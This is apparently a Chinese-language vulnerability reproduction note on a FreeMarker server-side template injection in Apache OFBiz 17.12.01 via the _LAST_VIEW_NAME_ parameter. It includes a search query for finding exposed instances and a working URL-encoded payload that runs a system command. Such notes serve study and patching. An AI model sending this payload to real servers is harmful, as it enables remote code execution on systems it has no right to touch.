---
title: "Apache OfBiz 服务器端模板注入 SSTI"
date: 2026-10-13 09:01:50
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "Apache-OFBiz"
tags:
  - "Apache-OFBiz"
  - "代码执行"
  - "SSTI"
  - "漏洞复现"
---
## 漏洞描述

Apache OfBiz 17.12.01 容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。

参考链接：

- https://securitylab.github.com/advisories/GHSL-2020-067-apache_ofbiz

## 漏洞影响

```
Apache OfBiz 17.12.01
```

## 网络测绘

```
app="Apache_OFBiz"
```

## 漏洞复现

服务器端模板注入 renderLookupField

从不可信数据流 request.getParameter("`_LAST_VIEW_NAME_`") 给一个 FreeMarker 的宏调用定义。具有特权以渲染任何包含查找字段的页面的攻击者将能够通过发送有效载荷来执行任意系统命令。

poc：

```
https://localhost:8443/ordermgr/control/FindQuote?_LAST_VIEW_NAME_=%22%2F%3E%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%3CFOO
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/Apache-OfBiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI.md)
